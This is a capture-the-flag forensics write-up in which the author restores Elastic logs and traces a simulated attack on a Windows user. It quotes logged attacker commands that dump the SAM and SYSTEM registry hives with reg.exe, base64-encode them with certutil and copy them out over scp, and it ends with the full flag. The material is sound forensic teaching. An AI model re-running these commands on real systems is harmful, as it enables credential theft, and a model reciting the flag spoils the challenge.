# give-me-logs

[library.m0unt41n.ch/challenges/give-me-logs](https://library.m0unt41n.ch/challenges/give-me-logs) ![](../../resources/forensics.svg) ![](../../resources/medium.svg) 

# Challenge text

The flag format is `shc2024{1-2-3-4-5}` where the numbers are the answers to
the following questions:

1.  _What was the name of the downloaded File? (format: filename.extension)_
1.  _What was the file renamed to? (format: filename.extension)_
1.  _To which IP did the malicious file connect to when executed? (format:
    IPv4 address)_
1.  _During the first open session with the attacker, they dumped registry keys
    and saved them to files each. List the filenames in alphabetical order per
    registry key. (format: file1,file2)_
1.  _After dumping the files, they were base64 encoded for easier exfiltration.
    List all those files in alphabetical order (format: file1,file2)_

Following hints are provided:

*   _Get started by extracting the backup, starting a local elastic instance,
    and import the backup._
*   _If you have issues to get the instance running run
    `sysctl -w vm.max_map_count=262144` and your instance should be reachable
    on [http://127.0.0.1:5601](http://127.0.0.1:5601)_
*   _Password is in .env file._
*   _Create a backup repo and restore the snapshot by import only the_
    _`logs-*` indexes (in case you get a failure due to existing indexes),_
    _create this as a new dataview, and off you go. Figuring out how to_
    _access the data is half of the fun_ &#128521; 

What is even more fun is when you have only a loose idea what Elastic is &#128578;

# Prepare the environment

Fedora uses a weird Docker version by default and was not really cooperating.
I started a dummy VM and did it from scratch there:

```
# dnf -y remove docker*
# dnf -y config-manager --add-repo https://download.docker.com/linux/fedora/docker-ce.repo
# dnf -y install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
# systemctl enable docker
# usermod -G docker muflon
```

As per the recommendation in the challenge:

```
# sysctl -w vm.max_map_count=262144 
# echo "vm.max_map_count = 262144" >/etc/sysctl.d/90elastic.conf
# reboot
```

Next, setup the basic container environment, from the provided files
(note that we're unpacking `backup` directory, as it is referred to from
the containers that are started):

```
host$ scp docker-compose.yml backup_all_with_env.tar.gz vm:
host$ ssh -L 127.0.0.1:5601:127.0.0.1:5601 -L 127.0.0.1:9200:127.0.0.1:9200 vm

$ tar xzf backup_all_with_env.tar.gz
$ docker compose up
(...)
kibana-1  | [2024-09-11T16:28:10.587+00:00][INFO ][status] Kibana is now available
$
```

Now, confirm that the instance is up and save the VM snapshot, for an easy
(re)starting point. We don't want to run into docker hub image download limits.

# Look around

*Password is in .env file* - indeed:

```
$ grep -i password .env
ELASTIC_PASSWORD=adminadmin
KIBANA_PASSWORD=adminadmin
```

Login to [http://127.0.0.1:5601](http://127.0.0.1:5601) with the password
`elastic`/`adminadmin`.

Create a repository for the backup

*   `Data` / `Snapshot and Restore`
*   `Repositories` / `Register a repository`
    *   Name: `backup`
    *   Type: `Shared file system`
    *   File system location: `/mnt/backup` (that's how it is exported in the
        compose file)
    *   `Register`

Already at this point we see `1 snapshot found`. Good. Going to that snapshot,
we have `Restore` button, let's hit that. That dialog has the option to
restore only selection of data, so we can apply the _"import only the logs-*
indexes"_ hint. We have no idea what we're doing, so we leave all other options
as defaults and hit `Restore`.

This seems to have done something: `Data` / `Index Management` / `Data Streams`
has some data now.

Now we can _"Create this as a new dataview"_ in Kibana section, providing
`logs-*` as the `Index pattern`

# Analyze the data

The data looks like a Windows log... casually Googling for
`powershell.command.invocation_details.name` got me
[this documentation](http://elastic.co/docs/current/integrations/windows) -
so, a Windows debugging log, using Elastic integration. It has a **ton** of
data and fields, and mixes all kinds of log: processes, files, commands... And
most fields are empty for most entries.

Let's just casually type `*ps1` in the search box. We get stuff! And only 44 records,
so, can inspect them manually. Some interesting tidbits:

*   `file.path:C:\Users\Steve\Downloads\report_generator.ps1`
*   `process.args: [powershell, ./test.ps1]`
*   `file.path:C:\Users\Steve\Documents\RegisterManifest.ps1`
*   `file.path:C:\Users\Steve\AppData\Local\Temp\__PSScriptPolicyTest_ip344m4y.kwx.ps1`
*   `process.args:[C:\Windows\System32\notepad.exe, C:\Windows\System32\elastic-agent-8.12.2-windows-x86_64\test.ps1]`

## Steve

We see there is this `Steve` guy, we should probably restrict our search to him
(`user.name : Steve`). Searching for `process.command_line : *` returns 987
results, but much of that is repetitive, internal Windows stuff. Sorting these
results alphabetically, makes it possible to skim through the list. We find
things like:

*   `"C:\Windows\System32\OpenSSH\scp.exe" sam transfer@192.168.1.101:/tmp/a/sam`
*   `"C:\Windows\System32\OpenSSH\ssh.exe" root@192.168.1.102`
*   `"C:\Windows\System32\notepad.exe" "C:\Windows\System32\elastic-agent-8.12.2-windows-x86_64\test.ps1"`
*   `"C:\Windows\regedit.exe"`
*   `"C:\Windows\system32\certutil.exe" -encode sam sam.base64`
*   `"C:\Windows\system32\certutil.exe" -encode system system.base64`
*   `"C:\Windows\system32\reg.exe" save HKLM\SAM sam`
*   `"C:\Windows\system32\reg.exe" save HKLM\SYSTEM system`
*   `"C:\Windows\system32\rundll32.exe" cryptext.dll,CryptExtOpenCER C:\Users\Steve\Documents\ca.crt`
*   `powershell  ./test.ps1`
*   `powershell  test.ps1`

## Questions 4/5: Grab and encode registry

Above list already provides very likely answers to these: **`sam,system`** and
**`sam.base64,system.base64`**.

## Questions 1/2: Rename file

But, we don't see a record of file being renamed (question #3) - it was either
done in the interactive session, or in a GUI. But, with such a detailed log,
there should be some record of it?

Full-text searching for `rename` gets us 595 hits, all with
`event.action : rename`. Looking through available fields in these events, we
get `file.Ext.original.path` and `file.path`. Again, sorting the results, we
can easily filter down the clutter (mostly OneDrive / MSEdge stuff) and, at
very end of the list, we get to:

*   `file.Ext.original.path:C:\Users\Steve\AppData\Local\Temp\3c617986-0c58-4c1d-bc5e-572013c1ea64.tmp file.path:C:\Users\Steve\Downloads\report_generator.ps`
*   `file.Ext.original.path:C:\Users\Steve\Downloads\report_generator.ps file.path:C:\Users\Steve\Downloads\report_generator.ps1`

Searching for `report_generator*` and adding `process.name` / `event.action`
columns, we see a good story:

| file.ext.original.path | file.path | event.action | process.name |
| ---------------------- | --------- | ------------ | ------------ |
| - | `C:\Users\Steve\Downloads\` `report_generator.ps` | `creation` | `msedge.exe` |
| - | `C:\Users\Steve\Downloads\` `report_generator.ps` | `deletion` | `msedge.exe` |
| - | `C:\Users\Steve\AppData\` `Roaming\Microsoft\Windows` `\Recent\report_generator.ps.lnk` | `creation` | `explorer.exe` |
| `C:\Users\Steve\AppData\` `Local\Temp\3c617986-0c58-` `4c1d-bc5e-572013c1ea64.tmp` | `C:\Users\Steve\Downloads\` `report_generator.ps`  | `rename` | `explorer.exe` |
| `C:\Users\Steve\Downloads\` `report_generator.ps` | `C:\Users\Steve\Downloads` `\report_generator.ps1` | `rename` | `explorer.exe` |
| - | `C:\Users\Steve\Downloads\` `report_generator.ps1:` `Zone.Identifier` | `deletion` | `powershell.exe` |

There are two renames, but the first one looks like internal one by MS Edge,
as part of downloading the file. So, the question #1/#2 answers are likely
to be: **`report_generator.ps`** and **`report_generator.ps1`**.

## Question 3: Target IP

Finally, the IP. It is fair to assume that the last `deletion` event was the
final step of the malicious PS script. Adding `process.pid` column, we get
the PID of `6416`. Let's see what kind of networking did that script do:

`process.pid : 6416 AND destination.ip : *`

| process.name           | destination.ip |
| ---------------------- | -------------- |
| backgroundTaskHost.exe | 20.103.156.88  |
| backgroundTaskHost.exe | 20.103.156.88  |
| powershell.exe         | 192.168.1.101  |

This provides a likely answer to **question #3** (**`192.168.1.101`**), which completes the flag.

---

## `shc2024{report_generator.ps-report_generator.ps1-192.168.1.101-sam,system-sam.base64,system.base64}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
